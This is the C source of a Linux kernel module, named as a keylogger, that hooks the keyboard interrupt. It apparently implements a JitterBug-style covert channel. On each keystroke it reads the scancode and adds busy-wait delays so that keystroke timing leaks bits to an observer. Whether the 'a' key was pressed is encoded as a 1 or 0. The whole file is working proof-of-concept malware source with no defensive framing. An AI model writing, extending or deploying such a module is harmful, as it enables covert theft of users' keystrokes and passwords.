#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/delay.h>
#include <linux/time.h>
#include <linux/init.h>

#define KBD_IRQ      1
#define KBD_DATA_REG 0x60

static struct timeval last;

// Given two times, one later and one earlier, compute the elapsed diff in millis
time_t get_milli_diff(struct timeval *later, struct timeval *earlier) {
  time_t elapsed_sec;
  suseconds_t elapsed_micro;

  elapsed_sec = later->tv_sec - earlier->tv_sec;
  elapsed_micro = later->tv_usec - earlier->tv_usec;

  return (elapsed_sec * 1000 + (elapsed_micro / 1000));
}

// Elapsed time since last call
time_t update_time(void) {
  struct timeval curr;
  time_t elapsed_milli;

  do_gettimeofday(&curr);

  elapsed_milli = get_milli_diff(&curr, &last);

  last = curr;

  return elapsed_milli;
}

void jitterbug(void) {
  // Current time
  struct timeval entry;

  // Current character
  char scancode;

  // Timing Window
  time_t window = 40;

  time_t elapsed;
  time_t m;

  entry = last;

  scancode = inb(KBD_DATA_REG);

  elapsed = update_time();

  printk(KERN_INFO "Elapsed (before delay): %ld milli\n", elapsed);

  m = elapsed % window;

  if (scancode == 30) { // Send a '1'
    mdelay((window - m) + (window / 2));
  } else { // Send a '0'
    mdelay(window - m);
  }

  update_time();

  printk(KERN_INFO "Elapsed (after delay): %ld milli\n", get_milli_diff(&last, &entry));

  return;
}

irqreturn_t kbd_interrupt(int irq, void *dummy) {
  jitterbug();
  
  return IRQ_HANDLED;
}
  

int __init keylog_init(void) {
  printk(KERN_INFO "Hello, world!\n");
  request_irq(KBD_IRQ, kbd_interrupt, IRQF_SHARED, "keyboard", (void *) kbd_interrupt);

  return 0;
}

void __exit keylog_exit(void) {
  free_irq(KBD_IRQ, (void *) kbd_interrupt);
  printk(KERN_INFO "Goodbye, world!\n");

  return;
}

module_init(keylog_init);
module_exit(keylog_exit);
